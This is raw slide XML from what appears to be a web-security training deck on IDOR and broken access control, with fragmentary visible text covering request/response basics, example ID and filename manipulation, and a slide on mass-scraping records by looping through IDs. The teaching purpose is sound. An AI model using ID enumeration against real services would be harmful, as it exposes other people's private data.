          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="173" name="Google Shape;173;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3063240"/>
            <a:ext cx="1828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You</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="174" name="Google Shape;174;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3456432"/>
            <a:ext cx="19202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your browser</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="175" name="Google Shape;175;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8442655" y="2743200"/>
            <a:ext cx="3108960" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 5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10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8716975" y="3154680"/>
            <a:ext cx="640080" cy="64008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77" name="Google Shape;177;p10"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8883396" y="3321101"/>
            <a:ext cx="307238" cy="307238"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="178" name="Google Shape;178;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9494215" y="3063240"/>
            <a:ext cx="1828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The app</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="179" name="Google Shape;179;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9494215" y="3456432"/>
            <a:ext cx="19202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code + db + os</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="180" name="Google Shape;180;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="2633472"/>
            <a:ext cx="55778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100"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>HTTP request  (your payload)</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr descr="preencoded.png" id="181" name="Google Shape;181;p10"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5715000" y="3017520"/>
            <a:ext cx="2011680" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr descr="preencoded.png" id="182" name="Google Shape;182;p10"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="5715000" y="3584448"/>
            <a:ext cx="2011680" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="183" name="Google Shape;183;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="4023360"/>
            <a:ext cx="557784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8A6FF"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="58A6FF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>HTTP response  (what it reveals)</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="184" name="Google Shape;184;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4937760"/>
            <a:ext cx="10241280"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B949E"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="1" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Every web attack is just sending a request the developer did not expect, then reading what came back closely enough to understand what happened.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="185" name="Google Shape;185;p10"/>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p10"/>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187" name="Google Shape;187;p10"/>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2" name="Shape 192"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="193" name="Google Shape;193;p13"/>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02</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="30000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="194" name="Google Shape;194;p13"/>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95" name="Google Shape;195;p13"/>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196" name="Google Shape;196;p13"/>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ACCESS CONTROL · IDOR</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="197" name="Google Shape;197;p13"/>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IDOR &amp; broken access control</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="198" name="Google Shape;198;p13"/>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Change the ID, get someone else's data. The server forgot to check if it's yours.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="199" name="Google Shape;199;p1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1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201" name="Google Shape;201;p1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6" name="Shape 206"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="207" name="Google Shape;207;p1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DEFINITION</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208" name="Google Shape;208;p14"/>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is IDOR?</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="209" name="Google Shape;209;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1965960"/>
            <a:ext cx="10607040" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 571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14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="2103120"/>
            <a:ext cx="987552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FB950"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>IDOR</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t> (Insecure Direct Object Reference) is a broken-access-control flaw: the app exposes a direct reference to an object (an id, key, or filename) and fails to verify you're authorized for that specific object. Manipulate the reference, reach data that isn't yours.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="211" name="Google Shape;211;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="64008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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="91440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3" name="Google Shape;213;p14"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1057046" y="3983126"/>
            <a:ext cx="263347" cy="263347"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="214" name="Google Shape;214;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="91440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700"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1700" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="58A6FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Numeric IDs</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="215" name="Google Shape;215;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="91440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150"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1150" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>/account?id=1001 -&gt; 1002</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1150" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="216" name="Google Shape;216;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="425196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14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="452628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18" name="Google Shape;218;p14"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4668926" y="3983126"/>
            <a:ext cx="263347" cy="263347"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="219" name="Google Shape;219;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="452628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700"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1700" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Predictable files</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="220" name="Google Shape;220;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="452628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150"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1150" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>/invoices/00471.pdf -&gt; 472</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1150" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="221" name="Google Shape;221;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="786384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14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="813816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23" name="Google Shape;223;p14"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8280806" y="3983126"/>
            <a:ext cx="263347" cy="263347"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="224" name="Google Shape;224;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="813816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78BA"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1700" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F778BA"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Leaked UUIDs</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="225" name="Google Shape;225;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="813816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150"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1150" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>an id found in another response</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1150" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="226" name="Google Shape;226;p1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228" name="Google Shape;228;p1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3" name="Shape 233"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="234" name="Google Shape;234;p15"/>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1200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F85149"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>REAL-WORLD IMPACT</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="235" name="Google Shape;235;p15"/>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attackers actually do with IDOR</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="236" name="Google Shape;236;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="21031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37" name="Google Shape;237;p15"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="2260031"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="238" name="Google Shape;238;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="20574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Mass-scrape every record</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="239" name="Google Shape;239;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="242316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Loop through IDs and download the entire dataset automatically.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="240" name="Google Shape;240;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="33375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41" name="Google Shape;241;p15"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="3494471"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
